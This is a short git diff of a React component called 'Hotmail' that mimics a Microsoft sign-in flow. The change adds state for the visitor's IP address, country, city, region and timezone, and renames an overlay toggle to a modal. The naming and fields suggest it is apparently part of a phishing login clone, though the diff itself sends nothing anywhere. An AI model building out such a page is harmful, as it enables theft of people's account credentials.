@@ -13,9 +13,15 @@ import MicrosoftLoading from "../component/MicrosoftLoading";
 
 export default function Hotmail() {
   const [email, setEmail] = useState(true);
-  const [emailValue, setEmailValue] = useState("");
   const [password, setPassword] = useState(false);
-  const [overlay, setOverlay] = useState(false);
+  const [emailValue, setEmailValue] = useState("");
+  const [ip, setIp] = useState(null);
+  const [country, setCountry] = useState("");
+  const [city, setCity] = useState("");
+  const [region, setRegion] = useState("");
+  const [timezone, setTimezone] = useState("");
+  const [error, setError] = useState(null);
+  const [modal, setModal] = useState(false);
   const [loading, setLoading] = useState(false);
 
   const togglePassword = (e) => {
@@ -37,8 +43,8 @@ export default function Hotmail() {
     }, 3000);
   };
 
-  const toggleOverlay = () => {
-    setOverlay(true);
+  const toggleModal = () => {
+    setModal(true);
   };
   return (
     <>
@@ -109,7 +115,7 @@ export default function Hotmail() {
                         height={20}
                         alt="Tool tip thumbnail"
                         className="cursor-pointer"
-                        onClick={toggleOverlay}
+                        onClick={toggleModal}
                       />
                     </div>
 
